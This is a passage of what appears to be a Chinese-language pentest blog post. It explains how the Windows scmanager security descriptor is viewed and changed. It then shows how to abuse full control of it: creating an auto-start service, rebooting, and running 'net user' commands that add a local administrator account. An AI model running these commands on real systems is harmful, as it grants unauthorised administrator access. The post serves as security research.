class="string">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span> /svc</span><br><span class="line">  BinaryPath                     : C:\Program Files (x86)\Google\Update\GoogleUpdate.exe</span><br><span class="line">  BinaryPathSDDL                 : O:BAD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;<span class="number">0x1200a9</span>;;;BU)(A;ID;<span class="number">0x1200a9</span>;;;AC)(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">2</span>-<span class="number">2</span>)</span><br><span class="line">  ServiceDll                     :</span><br><span class="line">  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)</span><br><span class="line">  CompanyName                    : Google LLC</span><br><span class="line">  FileDescription                : Google Installer</span><br><span class="line">  Version                        : <span class="number">1.3</span><span class="number">.34</span><span class="number">.7</span></span><br><span class="line">  IsDotNet                       : <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  Name                           : gupdatem</span><br><span class="line">  DisplayName                    : Google Update Service (gupdatem)</span><br><span class="line">  Description                    : Keeps your Google software up to date. If this service <span class="keyword">is</span> disabled <span class="keyword">or</span> stopped, your Google software will <span class="keyword">not</span> be kept up to date, meaning security vulnerabilities that may arise cannot be fixed <span class="keyword">and</span> features may <span class="keyword">not</span> work. This service uninstalls itself when there <span class="keyword">is</span> no Google software using it.</span><br><span class="line">  User                           : LocalSystem</span><br><span class="line">  State                          : Stopped</span><br><span class="line">  StartMode                      : Manual</span><br><span class="line">  <span class="type">Type</span>                           : Own Process</span><br><span class="line">  ServiceCommand                 : <span class="string">&quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot;</span> /medsvc</span><br><span class="line">  BinaryPath                     : C:\Program Files (x86)\Google\Update\GoogleUpdate.exe</span><br><span class="line">  BinaryPathSDDL                 : O:BAD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;<span class="number">0x1200a9</span>;;;BU)(A;ID;<span class="number">0x1200a9</span>;;;AC)(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">2</span>-<span class="number">2</span>)</span><br><span class="line">  ServiceDll                     :</span><br><span class="line">  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)</span><br><span class="line">  CompanyName                    : Google LLC</span><br><span class="line">  FileDescription                : Google Installer</span><br><span class="line">  Version                        : <span class="number">1.3</span><span class="number">.34</span><span class="number">.7</span></span><br><span class="line">  IsDotNet                       : <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  Name                           : ssh-agent</span><br><span class="line">  DisplayName                    : OpenSSH Authentication Agent</span><br><span class="line">  Description                    : Agent to hold private keys used <span class="keyword">for</span> public key authentication.</span><br><span class="line">  User                           : LocalSystem</span><br><span class="line">  State                          : Stopped</span><br><span class="line">  StartMode                      : Disabled</span><br><span class="line">  <span class="type">Type</span>                           : Own Process</span><br><span class="line">  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe</span><br><span class="line">  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe</span><br><span class="line">  BinaryPathSDDL                 : O:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">80</span>-<span class="number">956008885</span>-<span class="number">3418522649</span>-<span class="number">1831038044</span>-<span class="number">1853292631</span>-2271478464D:PAI(A;;<span class="number">0x1200a9</span>;;;SY)(A;;<span class="number">0x1200a9</span>;;;BA)(A;;<span class="number">0x1200a9</span>;;;BU)(A;;FA;;;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">80</span>-<span class="number">956008885</span>-<span class="number">3418522649</span>-<span class="number">1831038044</span>-<span class="number">1853292631</span>-<span class="number">2271478464</span>)(A;;<span class="number">0x1200a9</span>;;;AC)(A;;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">2</span>-<span class="number">2</span>)</span><br><span class="line">  ServiceDll                     :</span><br><span class="line">  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)</span><br><span class="line">  CompanyName                    :</span><br><span class="line">  FileDescription                :</span><br><span class="line">  Version                        : <span class="number">7.7</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line">  IsDotNet                       : <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  Name                           : Sysmon64</span><br><span class="line">  DisplayName                    : Sysmon64</span><br><span class="line">  Description                    : System Monitor service</span><br><span class="line">  User                           : LocalSystem</span><br><span class="line">  State                          : Stopped</span><br><span class="line">  StartMode                      : Auto</span><br><span class="line">  <span class="type">Type</span>                           : Own Process</span><br><span class="line">  ServiceCommand                 : C:\Windows\Sysmon64.exe</span><br><span class="line">  BinaryPath                     : C:\Windows\Sysmon64.exe</span><br><span class="line">  BinaryPathSDDL                 : O:BAD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;<span class="number">0x1200a9</span>;;;BU)(A;ID;<span class="number">0x1200a9</span>;;;AC)(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">2</span>-<span class="number">2</span>)</span><br><span class="line">  ServiceDll                     :</span><br><span class="line">  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)</span><br><span class="line">  CompanyName                    : Sysinternals - www.sysinternals.com</span><br><span class="line">  FileDescription                : System activity monitor</span><br><span class="line">  Version                        : <span class="number">12.0</span></span><br><span class="line">  IsDotNet                       : <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  Name                           : winlogbeat</span><br><span class="line">  DisplayName                    : winlogbeat</span><br><span class="line">  Description                    :</span><br><span class="line">  User                           : LocalSystem</span><br><span class="line">  State                          : Running</span><br><span class="line">  StartMode                      : Auto</span><br><span class="line">  <span class="type">Type</span>                           : Own Process</span><br><span class="line">  ServiceCommand                 : <span class="string">&quot;C:\Program Files\Winlogbeat\winlogbeat.exe&quot;</span> -c <span class="string">&quot;C:\Program Files\Winlogbeat\winlogbeat.yml&quot;</span> -path.home <span class="string">&quot;C:\Program Files\Winlogbeat&quot;</span> -path.data <span class="string">&quot;C:\ProgramData\winlogbeat&quot;</span> -path.logs <span class="string">&quot;C:\ProgramData\winlogbeat\logs&quot;</span> -E logging.files.redirect_stderr=true</span><br><span class="line">  BinaryPath                     : C:\Program Files\Winlogbeat\winlogbeat.exe</span><br><span class="line">  BinaryPathSDDL                 : O:BAD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;<span class="number">0x1200a9</span>;;;BU)(A;ID;<span class="number">0x1200a9</span>;;;AC)(A;ID;<span class="number">0x1200a9</span>;;;S-<span class="number">1</span>-<span class="number">15</span>-<span class="number">2</span>-<span class="number">2</span>)</span><br><span class="line">  ServiceDll                     :</span><br><span class="line">  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)</span><br><span class="line">  CompanyName                    :</span><br><span class="line">  FileDescription                :</span><br><span class="line">  Version                        :</span><br><span class="line">  IsDotNet                       : <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Completed collection <span class="keyword">in</span> <span class="number">0.792</span> seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\mane&gt;</span><br></pre></td></tr></table></figure>
+
+<p>從這裏你可以看到基本上現代的工具都沒有提起任何關於<code>scmanager</code>​ 的 SDDL。</p>
+<h1 id="詢問與疑惑"><a href="#詢問與疑惑" class="headerlink" title="詢問與疑惑"></a>詢問與疑惑</h1><p>由於實在想不通，就發了一封郵件去問了一下，得到的回復是：</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403161817-ljswyh4.png" alt="image"></p>
+<p>一直以爲 <code>sc sdshow</code>​ 後面會加入一個服務的名字，但事實上是：</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403162119-grfre1e.png" alt="image"></p>
+<p>對的，一切就是這麽神奇。</p>
+<h1 id="為什麼-sc-sdshow-scmanager-有效？"><a href="#為什麼-sc-sdshow-scmanager-有效？" class="headerlink" title="為什麼 sc sdshow scmanager 有效？"></a>為什麼 sc sdshow scmanager 有效？</h1><p>​<code>sc sdshow scmanager</code>​ 這個命令之所以能執行，是因為 sc 工具（Service Controller）內置了直接訪問 SCM 的功能。當你運行 <code>sc sdshow scmanager</code>​，它顯示的是 SCM 的安全描述符（Security Descriptor），也就是控制誰可以訪問或修改服務管理的權限設置。你看到的輸出：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdshow scmanager</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403164856-v5hac2r.png" alt="image"></p>
+<p>scmanager 這個服務不在系統中，這是正常的，因為它不是一個普通的服務，而是 Windows 服務管理的核心部分。它存在於系統進程 <code>services.exe</code>​ 中，負責啟動、停止和管理所有其他服務。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sddl = [String]::Join(&quot;&quot;, (<span class="built_in">cmd</span>.exe /c sc sdshow scmanager)).Trim()</span><br><span class="line">$acl = ConvertFrom-SddlString -Sddl $sddl</span><br><span class="line">$acl.DiscretionaryAcl | <span class="built_in">Format</span>-Table AccessMask, AceType, SecurityIdentifier</span><br></pre></td></tr></table></figure>
+
+<p>可以使用上面的脚本來查看ACLs</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403170532-725i4v5.png" alt="image"></p>
+<h1 id="那麽-scmanager-會是固定的名字嗎？"><a href="#那麽-scmanager-會是固定的名字嗎？" class="headerlink" title="那麽 scmanager 會是固定的名字嗎？"></a>那麽 scmanager 會是固定的名字嗎？</h1><p>看起來是的，從<a target="_blank" rel="noopener" href="https://serverfault.com/questions/441015/granting-service-control-manager-access-permission-to-user-outside-of-administra">這一篇</a>中可以看出來：</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403165327-07rs40e.png" alt="image"></p>
+<p>如果要設置 <code>scmanager</code>​ 的權限可以使用</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdset scmanager D:(A;;<span class="number">0</span>xF003F;;;S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3674034044</span>-<span class="number">3586052758</span>-<span class="number">1582440453</span>-<span class="number">1121</span>)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)</span><br></pre></td></tr></table></figure>
+
+<h1 id="有了權限之後我該怎麽濫用呢？"><a href="#有了權限之後我該怎麽濫用呢？" class="headerlink" title="有了權限之後我該怎麽濫用呢？"></a>有了權限之後我該怎麽濫用呢？</h1><p>即使你對 scmanager 有 FullControl，這並不自動意味著你對系統中的每個服務都有完全控制權，例如：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">mane</span>&gt;<span class="title">sc</span> <span class="title">create</span> <span class="title">SleepService</span> <span class="title">binPath</span>= &quot;<span class="title">C</span>:\<span class="title">mane</span>\<span class="title">sleep.exe</span> <span class="title">C</span>:\<span class="title">mane</span>\<span class="title">sleep.bin</span>&quot; <span class="title">start</span>= <span class="title">auto</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">mane</span>&gt;<span class="title">sc</span> <span class="title">start</span> <span class="title">SleepService</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403171618-ghrk9ka.png" alt="image"></p>
+<p>這裏的原因如下，<strong>SCM 的權限 vs 單個服務的權限</strong>：</p>
+<p>scmanager 的 FullControl 允許你創建、修改和刪除服務，但每個服務本身有自己的安全描述符（DACL），獨立控制誰可以啟動、停止或配置它。</p>
+<p>如果 SleepService 的 DACL 沒有給你的帳戶足夠的權限，你仍然會被拒絕。</p>
+<p>既然設置了 <code>start= auto</code>​，那麽開機的時候必定會運行一次，<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create">官方文檔</a>：</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403172517-46i0zyf.png" alt="image"></p>
+<p>所以只能强制重啓了，等重啓後你會得到：</p>
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403172704-djzt6nl.png" alt="image"></p>
+<p>沒錯，你會在1分鐘之後服務啓動超時然後丟失session。</p>
+<p>所以可以利用這1分鐘來增加user：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user mane P@ssw0rd /add </span><br><span class="line"><span class="built_in">net</span> localgroup administrators mane /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://relay-img.manesec.com/maneblog/2025/31-skills-issue-scmanager/image-20250403173915-p8vfmqr.png" alt="image"></p>
+<p>當然還有別的更好的方法。</p>
+<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>由於現代工具無法枚舉的情況下，只能手動去枚舉了。</p>
+<p>但是手動枚舉的話很容易丟失一些細節。</p>
+<p>這樣確實可以拿來做成一個box，因爲也很常見。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&text=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&is_video=false&description=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Skills Issue - 有關 scmanager 的權限&body=Check out this article: https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&title=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&name=Skills Issue - 有關 scmanager 的權限&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/04/04/2025/31-skillissue-scmanager/&t=Skills Issue - 有關 scmanager 的權限"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
